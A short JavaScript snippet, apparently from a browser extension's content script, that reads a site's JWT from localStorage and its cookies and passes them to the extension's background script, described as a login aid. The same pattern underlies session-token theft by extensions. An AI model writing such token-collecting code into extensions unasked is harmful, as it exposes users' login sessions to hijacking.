// get jwt and cookie to login
const token = localStorage.getItem("jwt:token");

const cookie = document.cookie;

// send to background
chrome.runtime.sendMessage({ jwtToken: token, cookie: cookie });
